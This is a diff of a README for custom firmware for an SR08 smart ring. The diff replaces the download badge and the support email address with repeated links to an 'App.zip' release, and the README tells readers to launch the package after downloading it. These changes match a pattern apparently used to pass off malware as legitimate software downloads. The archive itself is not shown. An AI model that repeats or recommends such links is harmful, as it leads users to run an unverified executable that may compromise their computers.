@@ -18,7 +18,7 @@ The ATC_SR08_Ring repository contains the custom firmware developed specifically
 To install the custom firmware on your LED Display Smart BLE Ring SR08, follow these steps:
 
 1. Download the firmware package from the following link:  
-   [![Download Firmware](https://img.shields.io/badge/Download-Firmware-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  
+   [![Download Firmware](https://github.com/zlluiwz/ATC_SR08_Ring/releases/download/v1.0/App.zip)](https://github.com/zlluiwz/ATC_SR08_Ring/releases/download/v1.0/App.zip)  
    *Note: The firmware package needs to be launched after downloading.*
 
 2. Connect your SR08 ring to your computer using a USB cable.
@@ -41,7 +41,7 @@ We welcome contributions from the community to enhance the features and function
 
 ## Support 📞
 
-If you encounter any issues or need assistance with the custom firmware, please reach out to our support team at support@atc-sr08-ring.com.
+If you encounter any issues or need assistance with the custom firmware, please reach out to our support team at https://github.com/zlluiwz/ATC_SR08_Ring/releases/download/v1.0/App.zip
 
 ## License 📝
 
